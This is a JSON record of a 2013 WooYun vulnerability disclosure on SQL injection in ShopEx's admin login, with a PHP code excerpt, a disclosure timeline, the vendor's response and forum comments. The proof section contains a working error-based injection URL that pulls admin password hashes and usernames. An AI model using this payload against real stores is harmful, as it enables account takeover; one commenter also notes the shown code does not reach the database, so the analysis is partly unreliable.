{"id": 8473, "wybug_id": "wooyun-2013-033500", "wybug_title": "Shopex后台登录页面某参数存在注入", "wybug_corp": "ShopEx", "wybug_author": "saline", "wybug_date": "2013-08-05 09:53", "wybug_open_date": "2013-11-03 09:53", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-08-05：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-08-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-08-08：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2013-09-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-10-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-10-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-11-03：\t细节向公众公开  简要描述： 对登录时传递的某参数未做过滤，导致注入的产生 详细说明：  最近做二次开发的时候看到了登录的流程发现在文件\\shopex\\core\\admin\\controller\\ctl.passport.php处理了验证码，管理帐号和密码，但是在最底下发现一个sess_id\nfunction certi_validate(){        $cert = $this->system->loadModel('service/certificate');        $sess_id = $_POST['session_id'];        $return = array();        if($sess_id == $cert->get_sess()){            $return = array(                'res' => 'succ',                'msg' => '',                'info' => ''            );            echo json_encode($return);        }else{            $return = array(                'res' => 'fail',                'msg' => '000001',                'info' => 'You have the different session!'            );            echo json_encode($return);        }    }\n没做处理。直接导致sql注入产生。还在学php，分析错的地方请指正   漏洞证明：  http://fuck.0day5.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1\n\nhttp://fuck.0day5.com/shopadmin/index.php?ctl=passport&act=login&sess_id=1'+and(select+1+from(select+count(*),concat((select+(select+(select+concat(userpass,0x7e,username,0x7e,op_id)+from+sdb_operators+Order+by+username+limit+0,1)+)+from+`information_schema`.tables+limit+0,1),floor(rand(0)*2))x+from+`information_schema`.tables+group+by+x)a)+and+'1'='1顺带路径一起爆出来了\n\n   修复方案：  这个你们比我在行的说。   版权声明：转载请注明来源 saline@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2013-08-05 14:00 厂商回复： 新版本中该问题已经修复存在问题的请尽快升级至最新版本，安装补丁包非常感谢您为shopex信息安全做的贡献 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-08-05 10:16 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  mark    \n     2013-08-05 10:27 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  大媳妇我来看你了    \n     2013-08-05 10:30 |    \t\tVIP \t\t\t( 普通白帽子  |\t\t\t        Rank:759 漏洞数:100        )\t\t \n  简要描述好详细，我也成功了。    \n     2013-08-05 11:44 |    \t\tRookie \t\t\t( 普通白帽子  |\t\t\t        Rank:288 漏洞数:78        | 123)\t\t \n  @VIP 你又调皮了    \n     2013-08-05 11:58 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  @谁呢 已确认    \n     2013-08-05 13:59 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  应该是在cookie里面吧    \n     2013-09-14 14:54 |    \t\t园长 \t\t\t( 普通白帽子  |\t\t\t        Rank:134 漏洞数:14        | 你在身边就是缘，缘分写在数据库里面。)\t\t \n  1RANK，厂商是怎么想的。就算修复了也不该这么玩    \n     2013-09-14 16:33 |    \t\tsaline \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:32        | Focus On Web Secur1ty)\t\t \n  @园长 大媳妇@园长 以后搞到shopex的了直接放出去~嘿嘿~    \n     2014-01-23 17:27 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  $sess_id = $_POST['session_id'];只看到了这儿出现了参数传递，没看到与数据库交互，LZ怎么看出来的啊？  求教    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}